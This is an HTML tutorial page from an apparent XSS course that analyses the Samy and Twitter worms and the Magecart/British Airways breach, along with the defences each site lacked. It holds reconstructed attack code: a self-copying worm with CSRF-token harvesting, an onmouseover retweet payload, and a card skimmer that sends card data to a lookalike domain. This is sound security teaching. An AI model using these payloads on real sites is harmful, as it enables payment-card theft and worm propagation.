@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 16 — Real-World Incidents: Annotated &amp; Reconstructed</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;line-height:1.7;padding:40px 32px;max-width:820px}
+  h1{font-size:26px;font-weight:800;color:var(--accent);margin-bottom:6px}
+  .mod-tag{font-size:12px;color:var(--muted);margin-bottom:36px;display:block}
+  h2{font-size:18px;font-weight:700;color:var(--warn);margin:36px 0 12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+  h3{font-size:14px;font-weight:700;color:var(--accent);margin:22px 0 8px}
+  p{font-size:14px;color:var(--text);margin-bottom:12px}
+  ul,ol{font-size:14px;color:var(--text);margin-left:22px;margin-bottom:12px}
+  li{margin-bottom:6px}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--accent);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:12px;line-height:1.7;color:var(--orange);margin:12px 0;white-space:pre-wrap}
+  .callout{border-left:3px solid var(--accent);background:var(--panel);padding:12px 16px;border-radius:0 6px 6px 0;margin:14px 0;font-size:13px;color:var(--muted)}
+  .callout strong{color:var(--text)}
+  .warn{border-left-color:var(--warn)}
+  .danger{border-left-color:var(--danger)}
+  .ok{border-left-color:var(--ok)}
+  table{width:100%;border-collapse:collapse;font-size:13px;margin:14px 0}
+  th{padding:8px 12px;background:#060d1a;color:var(--accent);text-align:left;font-size:12px;font-weight:700}
+  td{padding:7px 12px;border-top:1px solid var(--border);color:var(--muted);vertical-align:top}
+  td strong{color:var(--text)}
+  .nav{display:flex;gap:12px;margin-top:48px;padding-top:20px;border-top:1px solid var(--border)}
+  .nav a{font-size:13px;color:var(--accent);padding:8px 18px;border:1px solid var(--accent);border-radius:4px}
+  a{color:var(--accent)}
+  .incident-card{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin:16px 0}
+  .incident-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .incident-title{font-size:16px;font-weight:800;color:var(--warn)}
+  .incident-meta{font-size:11px;color:var(--muted);text-align:right}
+  .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;margin:0 3px 4px 0}
+  .tag-stored{background:#1a2500;color:var(--ok)}
+  .tag-worm{background:#2a0000;color:var(--danger)}
+  .tag-supply{background:#1a1500;color:var(--warn)}
+  .tag-blind{background:#0d1a30;color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>Module 16 — Real-World Incidents: Annotated &amp; Reconstructed</h1>
+<span class="mod-tag">XSS Mastery Course · Module 16 of 19</span>
+
+<p>Theory becomes conviction when you read the actual payloads. This module dissects four landmark XSS incidents — what ran, why it worked, what defense was absent, and what stopped it. Each has a standalone case study file with the reconstructed payload you can run against the lab.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>1. The Samy Worm (MySpace, 2005)</h2>
+
+<div class="incident-card">
+  <div class="incident-header">
+    <div>
+      <div class="incident-title">Samy Worm</div>
+      <div><span class="tag tag-stored">STORED XSS</span><span class="tag tag-worm">SELF-PROPAGATING</span></div>
+    </div>
+    <div class="incident-meta">MySpace · Oct 4–5 2005<br>~1 million accounts in 20 hours</div>
+  </div>
+  <p><strong>What happened:</strong> Samy Kamkar planted a stored XSS payload in his MySpace profile. Any user who viewed his profile had the payload execute in their browser. The payload: (1) added Samy as a friend, (2) added Samy to the viewer's "heroes" field, (3) copied itself into the viewer's own profile. Every infected user became a new vector. The worm spread to one million profiles overnight.</p>
+  <p><strong>The payload problem:</strong> MySpace filtered <code>&lt;script&gt;</code> tags but allowed CSS <code>style</code> attributes. Samy used <code>javascript:void(0)</code> in a CSS <code>background</code> property executed via an IE-specific <code>expression()</code> call — <code>background:url('javascript:void(eval(...))')</code>. He also bypassed the word "javascript" filter by splitting it: <code>java\nscript</code> (newline inside the keyword).</p>
+  <p><strong>Missing defense:</strong> No output encoding on user-supplied profile fields. Filter was string-based — trivially evaded. No CSP (didn't exist in 2005). No rate limiting on friend requests or profile writes.</p>
+  <p><strong>What stopped it:</strong> MySpace took the site offline for several hours to clean up. Samy was convicted under the CFAA.</p>
+</div>
+
+<h3>Reconstructed Payload (simplified, safe)</h3>
+<pre>// The real worm used obfuscated eval chains. Simplified structure:
+// 1. Add attacker as friend (AJAX POST with CSRF token harvested from page)
+// 2. Copy self to viewer's profile (AJAX POST to profile update endpoint)
+// 3. The "copy self" step is what makes it a worm
+
+// Modern equivalent structure:
+fetch('/auth/settings').then(r =&gt; r.text()).then(html =&gt; {
+  const token = (html.match(/csrf.*?value="([^"]+)"/) || [])[1] || '';
+  // Step 1: add attacker as friend
+  fetch('/social/add-friend', {method:'POST', body:'friend=attacker&amp;csrf='+token,
+    headers:{'Content-Type':'application/x-www-form-urlencoded'}});
+  // Step 2: copy worm to own profile (self-propagation)
+  const worm = document.currentScript.outerHTML || '&lt;the payload&gt;';
+  fetch('/auth/profile', {method:'POST', body:'bio='+encodeURIComponent(worm)+'&amp;csrf='+token,
+    headers:{'Content-Type':'application/x-www-form-urlencoded'}});
+});</pre>
+
+<p>See <a href="case_studies/samy_worm.html">case_studies/samy_worm.html</a> for the full annotated reconstruction and a mini-worm demo against the lab's comment board.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>2. Twitter "onMouseOver" Worm (2010)</h2>
+
+<div class="incident-card">
+  <div class="incident-header">
+    <div>
+      <div class="incident-title">Twitter onMouseOver Worm</div>
+      <div><span class="tag tag-stored">STORED XSS</span><span class="tag tag-worm">SELF-PROPAGATING</span></div>
+    </div>
+    <div class="incident-meta">Twitter · Sep 21 2010<br>Tens of thousands of tweets in hours</div>
+  </div>
+  <p><strong>What happened:</strong> A Twitter bug allowed event handler injection via the <code>onMouseOver</code> attribute in tweet text. The tweet <code>onmouseover=…</code> ran JavaScript whenever any user's mouse passed over it. The payload retweeted itself — anyone who saw the infected tweet in their timeline and moved their mouse over it spread it further.</p>
+  <p><strong>Payload:</strong> Simply <code>onmouseover="...."</code> injected directly into tweet display HTML. No angle brackets required — classic attribute injection (Module 08 technique).</p>
+  <p><strong>What it ran:</strong></p>
+  <pre>onmouseover="document.getElementById('status').value=
+  document.getElementsByTagName('textarea')[0].innerHTML=
+  this.textContent; document.forms[0].submit()"</pre>
+  <p>In other variants, the payload auto-opened popups, redirected to porn sites, and sent DMs. Some used <code>style=position:fixed;width:100%;height:100%</code> to ensure the full page was the hover target — guaranteeing execution on any mouse move.</p>
+  <p><strong>Missing defense:</strong> Output encoding failure on tweet display. The tweet text was reflected into HTML without escaping. Fixed in hours by Twitter.</p>
+</div>
+
+<p>See <a href="case_studies/twitter_worm.html">case_studies/twitter_worm.html</a> for the annotated reconstruction.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>3. Magecart (British Airways, Ticketmaster, 2018)</h2>
+
+<div class="incident-card">
+  <div class="incident-header">
+    <div>
+      <div class="incident-title">Magecart / British Airways Breach</div>
+      <div><span class="tag tag-supply">SUPPLY CHAIN XSS</span><span class="tag tag-blind">PERSISTENT SKIMMER</span></div>
+    </div>
+    <div class="incident-meta">British Airways · Aug–Sep 2018<br>~500,000 customers' card details stolen</div>
+  </div>
+  <p><strong>What happened:</strong> Attackers compromised a JavaScript file served from a BA-trusted CDN (Modernizr-like utility). They injected 22 lines of JavaScript that silently skimmed payment card data from the checkout form and exfiltrated it to a lookalike domain (<code>baways.com</code> instead of <code>ba.com</code>).</p>
+  <p><strong>Why it's XSS:</strong> The injected script ran same-origin, with full access to form fields, the DOM, and cookies. It's a supply-chain XSS — the attacker didn't find an injection point in BA's code, they injected into a dependency.</p>
+  <p><strong>The skimmer payload (reconstructed):</strong></p>
+  <pre>// Runs on payment page, reads card form fields on submit
+document.getElementById('payment-form').addEventListener('submit', function(e) {
+  const card = {
+    name:    document.querySelector('[name=cardName]').value,
+    number:  document.querySelector('[name=cardNumber]').value,
+    expiry:  document.querySelector('[name=expiry]').value,
+    cvv:     document.querySelector('[name=cvv]').value,
+    email:   document.querySelector('[name=email]').value,
+    origin:  location.href
+  };
+  // Exfiltrate to attacker domain — lookalike URL
+  new Image().src = 'https://baways.com/c?' + new URLSearchParams(card);
+  // Don't cancel — real form still submits, victim never notices
+});</pre>
+  <p><strong>Missing defense:</strong> No Subresource Integrity (SRI) on the third-party script. No CSP restricting external connections. No monitoring of outbound requests. The skimmer ran for 15 days undetected.</p>
+  <p><strong>What would have stopped it:</strong> SRI (<code>integrity="sha256-…"</code> on the script tag) would have blocked the tampered file from loading. CSP <code>connect-src</code> restricting outbound fetches to known domains would have blocked the exfiltration.</p>
+</div>
+
+<p>See <a href="case_studies/magecart.html">case_studies/magecart.html</a> for the full skimmer reconstruction you can run against the lab checkout page.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>4. British Airways in Depth — Supply Chain XSS</h2>
+
+<p>The BA breach is the canonical example of why "we don't have XSS in our code" is insufficient. The attack surface includes every script tag on every page. See <a href="case_studies/ba_breach.html">case_studies/ba_breach.html</a> for a detailed breakdown of the 22-line skimmer, the CDN trust model failure, and how SRI + CSP together close the gap.</p>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>5. Cross-Incident Patterns</h2>
+
+<table>
+  <tr><th>Incident</th><th>XSS Type</th><th>Mechanism (from M03)</th><th>Missing Defense</th></tr>
+  <tr><td><strong>Samy Worm</strong></td><td>Stored, self-propagating</td><td>Event handler + URI scheme (CSS expression)</td><td>Output encoding + word-level filter trivially evaded</td></tr>
+  <tr><td><strong>Twitter Worm</strong></td><td>Stored, self-propagating</td><td>Event handler injection (attribute injection, M08)</td><td>Output encoding on tweet display</td></tr>
+  <tr><td><strong>Magecart/BA</strong></td><td>Supply chain</td><td>Script tag injection (trusted third-party JS)</td><td>SRI, CSP connect-src, dependency monitoring</td></tr>
+  <tr><td><strong>Ticketmaster (Magecart)</strong></td><td>Supply chain</td><td>Same — Inbenta chat widget compromised</td><td>Same — SRI, CSP, third-party script auditing</td></tr>
+</table>
+
+<div class="callout warn"><strong>Pattern:</strong> In every worm case, self-propagation requires a stored XSS sink that writes back to a profile, post, or user-controlled field. Without the write-back step, a worm cannot replicate. Separating write permissions from display contexts (different subdomains, sandboxed iframes) breaks the replication loop.</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2>6. Research Value of Historical Incidents</h2>
+
+<p>As a PhD researcher, historical incidents give you:</p>
+<ul>
+  <li><strong>Ground truth:</strong> Real payloads that bypassed real defenses at a specific point in time</li>
+  <li><strong>Defense gap evidence:</strong> Every incident is proof that a specific defense was absent or insufficient</li>
+  <li><strong>Worm mechanics:</strong> The Samy worm is a complete case study in viral propagation — read rate, replication fidelity, detection lag</li>
+  <li><strong>Supply chain threat model:</strong> BA/Magecart defines the threat model for any site that loads third-party JS (which is almost every production site)</li>
+</ul>
+
+<div class="nav">
+  <a href="../module_15/tutorial.html">← Module 15: Attack Chaining</a>
+  <a href="../module_17/tutorial.html">Module 17: Defenses →</a>
+</div>
+
+</body>
+</html>
